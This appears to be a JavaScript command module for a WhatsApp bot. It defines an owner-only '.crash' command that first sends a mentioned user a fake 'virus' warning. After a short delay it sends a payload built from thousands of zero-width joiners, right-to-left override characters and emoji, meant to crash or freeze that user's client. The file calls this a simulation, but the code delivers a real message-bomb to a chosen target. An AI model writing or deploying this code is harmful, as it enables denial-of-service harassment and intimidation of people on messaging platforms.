export const name = 'crash';
export const description = 'Simulates a client crash by sending large corrupted text (owner only)';
export const category = 'Owner';

const CRASH_TEXT = '‍'.repeat(3000) + '\u202E'.repeat(1000) + '💀'.repeat(1000);

export async function execute(sock, msg, args, context) {
  const { senderJid, isBotOwner, sendReply, mentionedJid } = context;

  const where = msg.key.remoteJid;

  if (!isBotOwner) {
    return sendReply(where, '🚫 You are not authorized to use this command.');
  }

  if (!mentionedJid || mentionedJid.length === 0) {
    return sendReply(where, '⚠️ Please mention a user to crash.\nUsage: .crash @user');
  }

  const target = mentionedJid[0];

  // Send warning to initiator
  await sendReply(where, `⚠️ Crash command initiated.\nUse responsibly. You are liable for any misuse.\n\n*Target:* @${target.split('@')[0]}`, {
    mentions: [target],
  });

  try {
    // Send a fake virus warning
    await sock.sendMessage(target, {
      text: `☣️ *Warning: You have been targeted by a simulated bot virus!*\n\nThis message is meant to simulate a crash for demonstration purposes.\n\nProceed at your own risk...`,
    });

    // Delay then send "crash" payload
    setTimeout(async () => {
      await sock.sendMessage(target, {
        text: CRASH_TEXT
      });
    }, 1500);

  } catch (err) {
    console.error('❌ Crash command failed:', err);
    await sendReply(where, `❌ Failed to send crash message: ${err.message}`);
  }
}
